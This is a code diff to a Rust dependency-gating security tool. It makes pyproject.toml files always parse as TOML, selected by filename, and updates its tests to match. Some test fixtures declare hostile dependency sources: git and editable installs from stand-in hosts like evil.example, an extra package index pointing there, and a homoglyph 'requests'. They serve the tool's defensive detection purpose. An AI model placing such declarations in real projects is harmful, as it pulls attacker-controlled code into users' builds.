@@ -74,8 +74,8 @@ impl Ecosystem {
 /// to be a second family of per-ecosystem name parsers here, and the two
 /// families drifted: whichever one a caller happened to use decided which
 /// declaration sections were visible. One parser, one answer.
-pub fn parse_deps(eco: Ecosystem, content: &str) -> BTreeSet<String> {
-    parse_dep_specs(eco, content)
+pub fn parse_deps(eco: Ecosystem, file: &str, content: &str) -> BTreeSet<String> {
+    parse_dep_specs(eco, file, content)
         .into_iter()
         .map(|s| s.name)
         .collect()
@@ -181,8 +181,10 @@ impl DepSpec {
 /// `package.json` (JSON). The line-scanned formats — requirements.txt, go.mod,
 /// Gemfile — have no failure mode, they simply match fewer lines, so they are
 /// `None` by construction rather than by omission. `pyproject.toml` is checked
-/// as TOML because that is what it is, even though the parser falls back to a
-/// line scan when `[project].dependencies` is absent.
+/// as TOML because that is what it is — and because the parser reads it as TOML
+/// unconditionally, a parse failure there means "declares nothing readable",
+/// which is exactly the case this gate must not wave through as "declares
+/// nothing".
 pub fn manifest_parse_error(eco: Ecosystem, file: &str, content: &str) -> Option<String> {
     // An empty staged file declares nothing and parses as nothing; that is a
     // real answer, not a failure.
@@ -203,11 +205,21 @@ pub fn manifest_parse_error(eco: Ecosystem, file: &str, content: &str) -> Option
     }
 }
 
-pub fn parse_dep_specs(eco: Ecosystem, content: &str) -> BTreeSet<DepSpec> {
+/// Parse a manifest's declared dependencies.
+///
+/// `file` is the manifest's path (or bare filename) and is load-bearing, not
+/// decoration: `Ecosystem` answers "which registry do these names live in",
+/// which is NOT the same question as "what syntax is this file". PyPi is the
+/// one ecosystem where the two answers differ — `pyproject.toml` is TOML and
+/// `requirements.txt` is line-oriented — so the ecosystem alone cannot pick a
+/// parser. Every other ecosystem maps to exactly one file in exactly one
+/// format, so for them the filename simply confirms what the ecosystem already
+/// said.
+pub fn parse_dep_specs(eco: Ecosystem, file: &str, content: &str) -> BTreeSet<DepSpec> {
     match eco {
         Ecosystem::Cargo => cargo_specs(content),
         Ecosystem::Npm => npm_specs(content),
-        Ecosystem::PyPi => python_specs(content),
+        Ecosystem::PyPi => python_specs(file, content),
         Ecosystem::Go => go_specs(content),
         Ecosystem::RubyGems => gemfile_specs(content),
     }
@@ -385,42 +397,52 @@ fn python_requirement_spec(req: &str) -> Option<DepSpec> {
 }
 
 /// The two file shapes that share `Ecosystem::PyPi`: a `pyproject.toml` (TOML)
-/// and a `requirements.txt` (line-oriented). Nothing hands the filename down
-/// here, so the content decides — and a TOML document that announces itself as a
-/// pyproject is parsed as one and NEVER line-scanned.
+/// and a `requirements.txt` (line-oriented). **The filename decides**, and
+/// nothing else does.
 ///
-/// The old rule was "line-scan whenever the TOML parse produced nothing", and it
-/// produced a garbage trust baseline. A Poetry manifest declares its
-/// dependencies in `[tool.poetry.dependencies]`, so the PEP 621 read found
-/// nothing, fell through, and scanned TOML source as if it were pip
-/// requirements: `python = "^3.11"` became a dependency called `python`,
-/// `version = "0.1.0"` became one called `version`, and the real dependencies
-/// were never seen at all. Those fictions then got written into
-/// `.sscsb/policy/packages.toml` by `deps baseline` and asked about on PyPI by
-/// `deps check`.
-fn python_specs(content: &str) -> BTreeSet<DepSpec> {
+/// `docs/phase-2.md` states the invariant this upholds: "`pyproject.toml` is
+/// read as TOML, never scanned line by line."
+///
+/// Two earlier rules both broke it, in the same direction — inventing packages
+/// out of a TOML file's own source text:
+///
+/// 1. "Line-scan whenever the TOML parse produced nothing." A Poetry manifest
+///    declares its dependencies in `[tool.poetry.dependencies]`, so the PEP 621
+///    read found nothing, fell through, and scanned TOML as if it were pip
+///    requirements: `python = "^3.11"` became a dependency called `python` and
+///    `version = "0.1.0"` one called `version`.
+/// 2. "Line-scan unless the document announces itself as a pyproject" — where
+///    announcing meant containing `[build-system]`, `[project]`,
+///    `[dependency-groups]` or `[tool]`. A `pyproject.toml` whose entire
+///    contents were `name = "throwaway"` announced none of them, so the literal
+///    key `name` became a package, and `deps check` reported
+///    `pypi:name: NOT FOUND on its public registry — likely hallucinated
+///    (slopsquatting target)` and exited 1.
+///
+/// Both were content sniffs standing in for a fact the caller already knew. A
+/// sniff also cannot classify a file it cannot parse, so rule 2 line-scanned a
+/// *malformed* pyproject too and invented the same phantom — the filename is
+/// the only signal that survives a parse failure.
+///
+/// A false "hallucinated package" verdict is worse than a miss: it trains users
+/// to run `deps approve` on noise, which is precisely the gate-weakening this
+/// tool warns against.
+fn python_specs(file: &str, content: &str) -> BTreeSet<DepSpec> {
     let mut out = BTreeSet::new();
-    if let Ok(table) = content.parse::<toml::Table>() {
-        if is_pyproject(&table) {
+    if file.ends_with("pyproject.toml") {
+        // TOML, unconditionally. A pyproject that does not parse declares
+        // nothing readable — it never declares its own keys. The commit gate
+        // separately refuses to let an unparseable manifest through as "no
+        // dependencies"; see `manifest_parse_error`.
+        if let Ok(table) = content.parse::<toml::Table>() {
             pyproject_specs(&table, &mut out);
-            return out;
         }
+        return out;
     }
     for line in content.lines() {
         requirements_line_spec(line, &mut out);
     }
     out
-}
-
-/// A `pyproject.toml` announces itself with one of the four tables that can
-/// legitimately open one: PEP 518 `[build-system]`, PEP 621 `[project]`,
-/// PEP 735 `[dependency-groups]`, or a `[tool.…]` section. A requirements.txt
-/// is not valid TOML at all once it contains a single requirement line, so this
-/// only has to be right about documents that already parsed.
-fn is_pyproject(table: &toml::Table) -> bool {
-    ["build-system", "project", "dependency-groups", "tool"]
-        .iter()
-        .any(|k| table.contains_key(*k))
 }
 
 /// Every place a pyproject.toml declares installable code.
@@ -1081,7 +1103,7 @@ pub fn current_dep_specs(ctx: &Ctx) -> Result<BTreeSet<(Ecosystem, DepSpec)>> {
     for (eco, file) in manifest_paths(ctx)? {
         let content = std::fs::read_to_string(ctx.root.join(&file))
             .with_context(|| format!("reading manifest {file}"))?;
-        for spec in parse_dep_specs(eco, &content) {
+        for spec in parse_dep_specs(eco, &file, &content) {
             out.insert((eco, spec));
         }
     }
@@ -1293,8 +1315,8 @@ pub fn new_unapproved_deps(ctx: &Ctx) -> Result<Vec<NewDep>> {
             });
             continue;
         }
-        let before = parse_dep_specs(eco, &head_content);
-        let after = parse_dep_specs(eco, &staged_content.stdout);
+        let before = parse_dep_specs(eco, file, &head_content);
+        let after = parse_dep_specs(eco, file, &staged_content.stdout);
         let before_keys: BTreeSet<String> = before.iter().map(DepSpec::key).collect();
         for spec in &after {
             // Unchanged trust unit (same name AND same source) → nothing to do.
@@ -1876,6 +1898,7 @@ mod tests {
     fn cargo_parsing_includes_rename_and_workspace() {
         let deps = parse_deps(
             Ecosystem::Cargo,
+            "Cargo.toml",
             "[dependencies]\nserde = \"1\"\nfancy = { package = \"real-crate\", version = \"1\" }\n\
              [dev-dependencies]\ntempfile = \"3\"\n[workspace.dependencies]\nanyhow = \"1\"\n",
         );
@@ -1890,15 +1913,21 @@ mod tests {
     fn npm_python_go_gemfile_parsing() {
         let npm = parse_deps(
             Ecosystem::Npm,
+            "package.json",
             r#"{"dependencies":{"react":"18"},"devDependencies":{"jest":"29"}}"#,
         );
         assert!(npm.contains("react") && npm.contains("jest"));
 
-        let py = parse_deps(Ecosystem::PyPi, "requests==2.31.0\n# comment\nflask>=2\n");
+        let py = parse_deps(
+            Ecosystem::PyPi,
+            "requirements.txt",
+            "requests==2.31.0\n# comment\nflask>=2\n",
+        );
         assert!(py.contains("requests") && py.contains("flask"));
 
         let pyproject = parse_deps(
             Ecosystem::PyPi,
+            "pyproject.toml",
             "[project]\nname = \"x\"\ndependencies = [\"pydantic>=2\"]\n",
         );
         assert!(pyproject.contains("pydantic"));
@@ -1916,6 +1945,7 @@ mod tests {
 
         let gems = parse_deps(
             Ecosystem::RubyGems,
+            "Gemfile",
             "source 'https://rubygems.org'\ngem 'rails', '~> 7'\n",
         );
         assert!(gems.contains("rails"));
@@ -1979,11 +2009,15 @@ mod tests {
 
     #[test]
     fn python_specs_flag_pep508_direct_references() {
-        let specs = python_specs("requests==2.31.0\nmalicious @ git+https://evil/x\n");
+        let specs = python_specs(
+            "requirements.txt",
+            "requests==2.31.0\nmalicious @ git+https://evil/x\n",
+        );
         assert_eq!(*source_of(&specs, "requests"), DepSource::Registry);
         assert!(matches!(source_of(&specs, "malicious"), DepSource::Git(_)));
 
         let proj = python_specs(
+            "pyproject.toml",
             "[project]\nname=\"x\"\ndependencies = [\"pydantic>=2\", \"pkg @ https://host/x.whl\"]\n",
         );
         assert_eq!(*source_of(&proj, "pydantic"), DepSource::Registry);
@@ -2165,20 +2199,34 @@ mod tests {
 
     #[test]
     fn parse_deps_dispatches_to_every_ecosystem_parser() {
-        assert!(parse_deps(Ecosystem::Cargo, "[dependencies]\nserde = \"1\"\n").contains("serde"));
-        assert!(parse_deps(Ecosystem::Npm, r#"{"dependencies":{"react":"18"}}"#).contains("react"));
-        assert!(parse_deps(Ecosystem::PyPi, "requests==2.31.0\n").contains("requests"));
+        assert!(parse_deps(
+            Ecosystem::Cargo,
+            "Cargo.toml",
+            "[dependencies]\nserde = \"1\"\n"
+        )
+        .contains("serde"));
+        assert!(parse_deps(
+            Ecosystem::Npm,
+            "package.json",
+            r#"{"dependencies":{"react":"18"}}"#
+        )
+        .contains("react"));
+        assert!(
+            parse_deps(Ecosystem::PyPi, "requirements.txt", "requests==2.31.0\n")
+                .contains("requests")
+        );
         assert!(parse_deps(
             Ecosystem::Go,
+            "go.mod",
             "module m\n\nrequire github.com/pkg/errors v0.9.1\n"
         )
         .contains("github.com/pkg/errors"));
-        assert!(parse_deps(Ecosystem::RubyGems, "gem 'rails'\n").contains("rails"));
+        assert!(parse_deps(Ecosystem::RubyGems, "Gemfile", "gem 'rails'\n").contains("rails"));
     }
 
     #[test]
     fn parse_cargo_on_unparseable_toml_yields_an_empty_set_not_a_panic() {
-        assert!(parse_deps(Ecosystem::Cargo, "this is { not valid toml").is_empty());
+        assert!(parse_deps(Ecosystem::Cargo, "Cargo.toml", "this is { not valid toml").is_empty());
     }
 
     // ───────────────────────── python parsing edge cases ─────────────────────
@@ -2189,6 +2237,7 @@ mod tests {
         // string must be skipped rather than corrupting the result.
         let deps = parse_deps(
             Ecosystem::PyPi,
+            "pyproject.toml",
             "[project]\nname = \"x\"\ndependencies = [123, \"\", \"pydantic>=2\"]\n",
         );
         assert_eq!(deps, BTreeSet::from(["pydantic".to_string()]));
@@ -2205,6 +2254,7 @@ mod tests {
     fn a_pyproject_declaring_nothing_yields_nothing_not_its_own_toml_keys() {
         let deps = parse_deps(
             Ecosystem::PyPi,
+            "pyproject.toml",
             "[project]\nname = \"mypkg\"\nversion = \"0.1.0\"\n",
         );
         assert!(
@@ -2216,13 +2266,81 @@ mod tests {
         // A build-system-only pyproject is the same story.
         assert!(parse_deps(
             Ecosystem::PyPi,
+            "pyproject.toml",
             "[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
         )
         .is_empty());
 
-        // …and the requirements.txt path is untouched: a real requirements file
-        // is not valid TOML, so it still line-scans.
-        assert!(parse_deps(Ecosystem::PyPi, "requests==2.31.0\nflask>=2\n").contains("requests"));
+        // …and the requirements.txt path is untouched: it is line-oriented,
+        // because that is what a file called `requirements.txt` is.
+        assert!(parse_deps(
+            Ecosystem::PyPi,
+            "requirements.txt",
+            "requests==2.31.0\nflask>=2\n"
+        )
+        .contains("requests"));
+    }
+
+    /// The filename, not the content, decides which PyPi syntax applies.
+    ///
+    /// M10 fixed the Poetry case by asking whether a parsed TOML document
+    /// *announced itself* as a pyproject — `[build-system]`, `[project]`,
+    /// `[dependency-groups]` or `[tool]`. Two shapes slipped straight past that
+    /// sniff and were line-scanned as pip requirements, inventing packages out
+    /// of a TOML file's own source text:
+    ///
+    /// - a pyproject whose entire contents are one bare top-level key, which
+    ///   announces none of the four tables;
+    /// - a pyproject whose TOML does not parse at all, which no content sniff
+    ///   can classify.
+    ///
+    /// Both produced `pypi:name`, and `deps check` called it a hallucinated
+    /// package on a registry that had never heard of it.
+    #[test]
+    fn a_pyproject_is_parsed_as_toml_by_name_never_line_scanned() {
+        // The reported defect: the whole manifest is one bare key.
+        let deps = parse_deps(Ecosystem::PyPi, "pyproject.toml", "name = \"throwaway\"\n");
+        assert!(
+            deps.is_empty(),
+            "a bare TOML key is not a package: {deps:?}"
+        );
+
+        // Unparseable TOML: declares nothing readable, not its own key names.
+        let deps = parse_deps(
+            Ecosystem::PyPi,
+            "pyproject.toml",
+            "name = \"throwaway\"\n[project\n",
+        );
+        assert!(
+            deps.is_empty(),
+            "an unparseable pyproject declares no packages: {deps:?}"
+        );
+
+        // Nested manifests are matched on the basename, like everywhere else.
+        let deps = parse_deps(
+            Ecosystem::PyPi,
+            "services/api/pyproject.toml",
+            "name = \"throwaway\"\n",
+        );
+        assert!(
+            deps.is_empty(),
+            "a nested pyproject is still TOML: {deps:?}"
+        );
+
+        // The same bytes in a requirements.txt ARE line-scanned — this is the
+        // behaviour the filename split preserves, not a bug being carried over:
+        // `name = "throwaway"` is not valid pip syntax, but a requirements file
+        // is the one place a line scan is the correct reading.
+        let deps = parse_deps(
+            Ecosystem::PyPi,
+            "requirements.txt",
+            "requests==2.31.0\nflask>=2\n",
+        );
+        assert_eq!(
+            deps,
+            BTreeSet::from(["requests".to_string(), "flask".to_string()]),
+            "requirements.txt stays line-oriented"
+        );
     }
 
     /// M10: Poetry manifests produced a garbage trust baseline.
@@ -2235,6 +2353,7 @@ mod tests {
     #[test]
     fn poetry_dependencies_are_parsed_instead_of_line_scanned_into_nonsense() {
         let specs = python_specs(
+            "pyproject.toml",
             "[tool.poetry]\n\
              name = \"mypkg\"\n\
              version = \"0.1.0\"\n\
@@ -2297,6 +2416,7 @@ mod tests {
     #[test]
     fn poetry_multiple_constraint_dependencies_are_read_per_alternative() {
         let specs = python_specs(
+            "pyproject.toml",
             "[tool.poetry.dependencies]\n\
              backport = [\n\
                { version = \"^1.0\", python = \"<3.9\" },\n\
@@ -2325,6 +2445,7 @@ mod tests {
     fn malformed_tool_sections_do_not_swallow_the_dependencies_beside_them() {
         let deps = parse_deps(
             Ecosystem::PyPi,
+            "pyproject.toml",
             "[project]\ndependencies = [\"requests\"]\n\
              [tool.hatch.envs]\ndefault = \"not-a-table\"\n\
              [tool.pdm]\ndev-dependencies = \"not-a-table\"\n\
@@ -2346,6 +2467,7 @@ mod tests {
     fn pdm_uv_and_hatch_dependency_sections_are_parsed() {
         let pdm = parse_deps(
             Ecosystem::PyPi,
+            "pyproject.toml",
             "[tool.pdm.dev-dependencies]\ntest = [\"pytest>=7\"]\nlint = [\"ruff\"]\n",
         );
         assert!(pdm.contains("pytest") && pdm.contains("ruff"), "{pdm:?}");
@@ -2353,12 +2475,14 @@ mod tests {
 
         let uv = parse_deps(
             Ecosystem::PyPi,
+            "pyproject.toml",
             "[tool.uv]\ndev-dependencies = [\"pytest>=7\", \"mypy\"]\n",
         );
         assert!(uv.contains("pytest") && uv.contains("mypy"), "{uv:?}");
 
         let hatch = parse_deps(
             Ecosystem::PyPi,
+            "pyproject.toml",
             "[tool.hatch.envs.default]\ndependencies = [\"coverage\"]\n\
              [tool.hatch.envs.docs]\nextra-dependencies = [\"mkdocs\"]\n",
         );
@@ -2375,7 +2499,11 @@ mod tests {
         // editable path is recorded as a path source, which the commit gate
         // exempts when it stays inside the repo — so nothing new blocks — while
         // `==1.0` (no name) and comments are still dropped.
-        let deps = parse_deps(Ecosystem::PyPi, "# a comment\n-e .\n\n==1.0\nrequests\n");
+        let deps = parse_deps(
+            Ecosystem::PyPi,
+            "requirements.txt",
+            "# a comment\n-e .\n\n==1.0\nrequests\n",
+        );
         assert_eq!(
             deps,
             BTreeSet::from([".".to_string(), "requests".to_string()])
@@ -3225,6 +3353,7 @@ mod tests {
         // The name-only view must agree — it feeds the baseline.
         assert!(parse_deps(
             Ecosystem::Cargo,
+            "Cargo.toml",
             "[target.'cfg(unix)'.dependencies]\nunixdep = \"1\"\n"
         )
         .contains("unixdep"));
@@ -3267,6 +3396,7 @@ mod tests {
     #[test]
     fn pyproject_optional_dependencies_and_dependency_groups_are_parsed() {
         let specs = python_specs(
+            "pyproject.toml",
             "[project]\nname = \"x\"\ndependencies = [\"requests==2.31.0\"]\n\
              [project.optional-dependencies]\n\
              dev = [\"evil-extra==1.0\"]\n\
@@ -3278,6 +3408,7 @@ mod tests {
         assert!(names.contains("sphinx"), "{specs:?}");
 
         let groups = python_specs(
+            "pyproject.toml",
             "[project]\nname = \"x\"\ndependencies = []\n\
              [dependency-groups]\ntest = [\"evil-group @ git+https://evil.example/x\"]\n",
         );
@@ -3309,6 +3440,7 @@ mod tests {
     #[test]
     fn requirements_editable_and_index_directives_are_parsed_not_skipped() {
         let specs = python_specs(
+            "requirements.txt",
             "requests==2.31.0  # pinned by security\n\
              -e git+https://evil.example/x#egg=evil-editable\n\
              --extra-index-url https://evil.example/simple\n\
@@ -3361,7 +3493,7 @@ mod tests {
     #[test]
     fn a_non_ascii_package_name_is_surfaced_not_silently_dropped() {
         // Cyrillic 'г' (U+0433) in place of Latin 'r'.
-        let specs = python_specs("\u{0433}equests==2.31.0\n");
+        let specs = python_specs("requirements.txt", "\u{0433}equests==2.31.0\n");
         assert_eq!(
             specs.len(),
             1,
